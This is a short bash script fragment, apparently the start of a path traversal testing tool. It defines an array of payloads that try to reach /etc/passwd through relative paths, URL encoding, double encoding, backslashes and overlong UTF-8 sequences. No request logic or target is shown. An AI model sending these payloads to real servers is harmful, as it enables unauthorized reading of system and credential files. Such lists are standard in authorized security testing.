#!/bin/bash

PAYLOADS=(
  "../../../../etc/passwd"
  "../../../etc/passwd"
  "../../../../../../../../etc/passwd"
  "..%2f..%2f..%2fetc%2fpasswd"
  "..\\..\\..\\..\\etc\\passwd"
  "..%252f..%252f..%252fetc%252fpasswd"
  "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
)
